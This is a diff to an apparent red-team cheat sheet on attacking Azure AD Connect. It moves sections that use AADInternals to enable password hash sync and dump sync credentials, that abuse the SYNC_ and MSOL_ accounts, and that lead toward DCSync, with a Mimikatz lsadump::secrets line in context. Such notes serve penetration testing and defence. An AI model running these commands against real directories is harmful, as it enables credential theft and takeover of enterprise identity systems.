@@ -130,9 +130,17 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 - https://aadinternals.com/post/on-prem_admin/
 
 ## Azure AD Connect
+#### Turn on password hash sync
+- AAD Connect service account can turn on Password hash sync
+```
+Set-AADIntPasswordHashSyncEnabled -Enabled $true
+```
+
+## Password Hash Sync Abuse
 - When Azure AD Connect is configured. The `SYNC_` account and `MSOL_` account are created. (or `AAD_` if installed on a DC)
 - The `SYNC_` account has the role `Directory Synchronization Accounts` and can reset any password within the cloud and the `MSOL_` and `AAD_` account have DCSync rights.
 - The role is now shown in the Azure portal [Documentation](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#roles-not-shown-in-the-portal)
+- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
 
 #### Enumerate server where Azure AD connect is installed (on prem command)
 ```
@@ -150,21 +158,11 @@ Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
 Get-ADSyncConnector
 ```
 
-#### Turn of password hash sync
-- AAD Connect service account can turn on Password hash sync
-```
-Set-AADIntPasswordHashSyncEnabled -Enabled $true
-```
-
 #### Dumping AAD Connect credentials
 ```
 Import-Module .\AADInternals.psd1
 Get-AADIntSyncCredentials
 ```
-
-## Password Hash Sync Abuse
-- Account with `SYNC_` is created in Azure AD and can reset any users password in Azure AD.
-- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
 
 ### Abusing On-Prem MSOL_ Account
 #### Run DCSync with creds of MSOL_* account
